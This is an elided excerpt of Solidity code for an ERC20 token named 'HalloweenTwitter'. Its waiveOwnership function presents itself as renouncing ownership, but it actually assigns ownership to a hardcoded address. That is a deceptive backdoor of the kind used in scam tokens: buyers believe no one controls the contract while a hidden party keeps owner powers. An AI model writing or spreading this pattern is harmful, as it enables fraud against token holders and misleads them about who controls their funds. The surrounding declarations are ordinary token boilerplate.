...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x3218BD655ea4B156DC0EEae2145b2d5E6D2B2326));
        _owner = address(0x3218BD655ea4B156DC0EEae2145b2d5E6D2B2326);
    }
...
contract HalloweenTwitter is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "HalloweenTwitter";
    string private _symbol = "HTWITTER";
